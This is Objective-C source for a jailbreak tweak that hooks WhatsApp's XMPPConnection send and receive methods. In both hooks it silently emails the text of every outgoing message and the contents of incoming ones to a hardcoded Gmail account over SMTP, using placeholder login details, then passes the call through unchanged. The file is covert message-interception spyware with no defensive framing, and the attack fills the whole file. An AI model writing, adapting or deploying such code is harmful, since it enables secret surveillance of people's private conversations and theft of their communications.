#import "sendEmail.h"
#import "SKPSMTPMessage.h"
#import "NSData+Base64Additions.h"
//#import "CkoEmail.h"
//#import "CkoMailMan.h"

%hook XMPPConnection

- (void)sendMessage:(id)arg1{
	//%log;
	NSString *str1 = [arg1 text];
	//[sendEmail doThis:str1:@"Outgoing WhatsApp Message"];

        SKPSMTPMessage *testMsg = [[SKPSMTPMessage alloc] init];
        testMsg.fromEmail = @"123@gmail.com";
        testMsg.toEmail = @"123@gmail.com";
        testMsg.relayHost = @"smtp.gmail.com";
        testMsg.requiresAuth = YES;
        testMsg.login = @"123";
        testMsg.pass = @"password";
        testMsg.subject = @"Outgoing Whatsapp Message";
        testMsg.wantsSecure = YES; // smtp.gmail.com doesn't work without TLS!
    	NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,
        	str1,kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];  
	testMsg.parts = [NSArray arrayWithObjects:plainPart,nil,nil];
        [testMsg send];
	[testMsg release];	
        return %orig;
}
		

-(void)processIncomingMessages:(id)arg1 {
	//%log;
	NSString *str1 = [NSString stringWithFormat:@"%@",arg1];
	//[sendEmail doThis:str1:@"Incoming WhatsApp Message"];

        SKPSMTPMessage *testMsg = [[SKPSMTPMessage alloc] init];
        testMsg.fromEmail = @"123@gmail.com";
        testMsg.toEmail = @"123@gmail.com";
        testMsg.relayHost = @"smtp.gmail.com";
        testMsg.requiresAuth = YES;
        testMsg.login = @"123";
        testMsg.pass = @"password";
        testMsg.subject = @"Outgoing Whatsapp Message";
        testMsg.wantsSecure = YES; // smtp.gmail.com doesn't work without TLS!
    	NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,
        	str1,kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];  
	testMsg.parts = [NSArray arrayWithObjects:plainPart,nil,nil];
        [testMsg send];
        [testMsg release];	

	return %orig;
}


%end
